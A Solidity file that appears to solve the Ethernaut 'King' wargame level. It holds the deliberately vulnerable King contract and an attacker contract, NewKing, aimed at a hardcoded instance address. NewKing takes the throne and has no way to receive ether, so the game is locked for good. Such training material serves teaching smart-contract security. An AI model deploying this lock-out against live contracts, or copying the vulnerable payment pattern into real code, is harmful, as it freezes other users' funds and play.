// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract NewKing {
    King public king = King(0x09E19236ce1bec192ac024539bE6591Bb2032e2F);

    function claimKing() public payable {
        (bool sent, ) = payable(king).call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}
